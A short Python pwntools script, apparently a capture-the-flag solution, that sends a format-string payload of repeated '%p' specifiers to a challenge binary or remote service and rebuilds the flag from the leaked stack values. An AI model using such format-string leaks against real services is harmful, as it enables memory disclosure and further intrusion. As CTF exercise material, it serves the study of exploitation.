from pwn import *

if args.REMOTE:
    io = remote('0.0.0.0', 1234)
else:   
    io = process('./chall')

payload = '%p ' * 11

io.sendline(payload)

out = io.recv().decode().strip().split(' ')[5:]

flag = b''

for i in out:
    flag += p64(int(i, 16))

print(flag)